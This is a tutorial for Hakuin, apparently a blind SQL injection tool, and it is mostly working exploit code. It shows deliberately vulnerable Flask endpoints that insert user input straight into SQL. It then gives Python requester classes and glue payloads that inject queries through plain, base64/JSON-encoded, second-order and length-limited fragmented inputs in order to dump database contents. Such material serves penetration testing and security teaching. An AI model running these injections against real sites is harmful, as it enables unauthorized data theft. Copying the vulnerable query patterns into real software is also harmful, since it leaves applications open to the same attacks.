In this tutorial, we introduce Hakuin's most common features and show you how to use it to handle a variety of challenges you may encounter while exploiting BSQLI.


#### Basic Concepts
Consider a simple Flask application with the following endpoint:
```python
@app.route('/users')
def users():
    name = request.args['name']
    query = f'SELECT * FROM users WHERE name="{name}"'
    
    with DB.connect() as conn:
        user = conn.execute(text(query)).fetchone()[0]

    if user:
        return 'found', 200
    return 'oops', 404
```

The `name` parameter is not sanitized, so the endpoint is vulnerable to BSQLI.

To exploit the vulnerability, you need to instruct Hakuin on how to inject its queries. This is done by deriving the `Requester` class and overriding the `request` method. Aside from injecting queries, the method must determine whether they resolve to `True` or `False`.
```python
from hakuin import Requester

class SimpleRequester(Requester):
    async def request(self, query, ctx):
        # inject the query
        payload = query.render(ctx)
        name = f'XXX" OR ({payload}) --'
        url = 'http://target.com/users'
        async with aiohttp.request('GET', url, params={'name': name}) as resp:
            # determine the query result
            return resp.status == 200
```

Pay attention to the glue code in `name=XXX" OR ({payload})`. The`XXX"` part escapes the string literal in `WHERE name="{name}"`, the `--` turns the extra `"` into a comment to avoid breaking the SQL syntax, and the `OR ({payload})` ensures the SQL statement resolves to true if the payload is logically true and vice versa. There are many ways to glue the payload to the SQL statement, be creative!

Also, notice that there are many ways to infer the boolean result of the injected query. In the example above, we checked, whether the `resp.status == 200`, but we could just as well check whether the response includes the string `"found"`.

Now that everything is set, we can start dumping the database (DB). This is done via the `Extractor` class. The `Extractor` requires a `Requester` and the name of the DB management system (DBMS) it should generate queries for. Hakuin currently supports SQLite, MySQL, Postgres, MsSQL, and Oracle (experimental), but will soon include more engines.

Extracting table names can look like this.
```python
import asyncio
import aiohttp
from hakuin import Extractor, Requester

class SimpleRequester(Requester):
    ...

async def main():
    requester = SimpleRequester()
    ext = Extractor(requester=requester, dbms='sqlite')
    data = await ext.extract_table_names()
    print(data)

asyncio.run(main())
```

Although simple, this approach can be used to exploit most BSQLI vulnerabilities. Keep reading.


#### Payload Transformations
Let's spice things up. Look at the endpoint bellow.
```python
@app.route('/users')
def users():
    data = request.args['data']
    data = base64.b64decode(data.encode()).decode()
    name = json.loads(data)['name']
    query = f'SELECT * FROM users WHERE name="{name}"'
    ...
```

Again, the endpoint is vulnerable, but this time the user input goes through a series of transformations before it is inserted into the SQL statement.

The challenge here is to correctly prepare the input to hit the vulnerability. An example exploit is shown below.
```python
class RequesterWithTransformations(Requester):
    async def request(self, query, ctx):
        payload = query.render(ctx)
        data = json.dumps({'name': f'XXX" OR ({payload}) --'})
        data = base64.b64encode(data.encode()).decode()
        url = 'http://target.com/users'
        async with aiohttp.request('GET', url, params={'data': data}) as resp:
            return resp.status == 200
```



#### Higher Order Injection Vulnerabilities
Sometimes, the vulnerable endpoint is not the same as the one used to upload payloads. See these endpoints:
```python
SESSION = {
    'name': None,
}

@app.route('/register', methods=['POST'])
def register():
    SESSION['name'] = request.args['name']
    return 'ok', 200

@app.route('/profile')
def register():
    name = SESSION['name']
    query = f'SELECT * FROM users WHERE name="{name}"'
    
    with DB.connect() as conn:
        user = conn.execute(text(query)).fetchone()[0]

    if user:
        return 'found', 200
    return 'oops', 404
```

Here, the user-provided `name` is stored on the server via the `/register` endpoint and only then it is inserted into the SQL statement via `/profile`.

This second-order vulnerability can be exploited with the following code:
```python
class SecondOrderRequester(Requester):
    async def request(self, query, ctx):
        # upload the payload
        payload = query.render(ctx)
        name = f'XXX" OR ({payload}) --'
        url = 'http://target.com/register'
        async with aiohttp.request('post', url, params={'name': name}):
            pass

        # hit the vulnerable endpoint and infer the result
        url = 'http://target.com/profile'
        async with aiohttp.request('get', url) as resp:
            return resp.status == 200
```


#### Fragmented Injection
In some cases, the vulnerable application may impose input limitations, such as length checks:
```python
@app.route('/users')
def users():
    first_name = request.args['first_name']
    last_name = request.args['last_name']
    assert len(first_name) < 50 and len(last_name) < 50, 'Name too long.'
    query = f'SELECT * FROM users WHERE first_name="{first_name}" AND last_name="{last_name}"'
    ...
```

The main challenge here is dumping the DB with inputs shorter than 50 characters. One approach is to shorten the injected queries and adjust the extraction logic, but there is a simpler way. We can take advantage of the fact that both `first_name` and `last_name` are inserted into the same SQL statement. The trick is to split the payload into two smaller parts, called _fragments_, inject them through the two inputs, and modify the glue code to avoid breaking the syntax. Here’s how we can exploit it:
```python
class FragmentedRequester(Requester):
    async def request(self, query, ctx):
        payload = query.render(ctx)
        frag_1, frag_2 = payload.split('FROM')
        frag_2 = f'FROM {frag_2}'

        url = f'http://target.com/users?first_name=XXX" OR ({frag_1} /*&last_name=*/ {frag_2}) --'
        ...
```

Notice that we split the query at the `FROM` keyword. This prevents the query keywords from being split into multiple fragments, which would break the syntax (e.g., `SELECT column FR` and `OM table`). Additionally, `FROM` is typically near the middle of queries, making it a reasonable splitting point to bypassing length checks.

The glue code has become more complex. As before, the `XXX"` part escapes the string literal, `OR ({frag_1} ... {frag_2})` propagates the boolean query result through the vulnerable statement, and `--` comments out the extra `"`. However, in this case, the glue code must also handle the additional statement code between the two vulnerable inputs, specifically `" AND last_name="`. The easiest way to handle this is by commenting it out using `/* ... */`. Here’s a practical example:
```SQL
-- payload: SELECT column < 42 FROM table LIMIT 1 OFFSET 1
-- frag_1: SELECT column < 42
-- frag_2: FROM table LIMIT 1 OFFSET 1
-- first_name: XXX" OR (SELECT column < 42 /*
-- last_name: */ FROM table LIMIT 1 OFFSET 1) --

-- statement before injection:
SELECT * FROM users WHERE first_name="{first_name}" AND last_name="{last_name}"

-- statement after injection:
SELECT * FROM users WHERE first_name="XXX" OR (SELECT column < 42 /*" AND last_name="*/ FROM table LIMIT 1 OFFSET 1) --"
```



#### More Tutorials Coming Soon
So far, we only explained how to customize the injection and inference logic, but Hakuin allows you to customize everything, even the query generation and extraction logic. We will cover these topics soon.

Additionally, we are writing a high-level overview of the optimization methods used by Hakuin under the hood. The document will be published once ready. Stay tuned.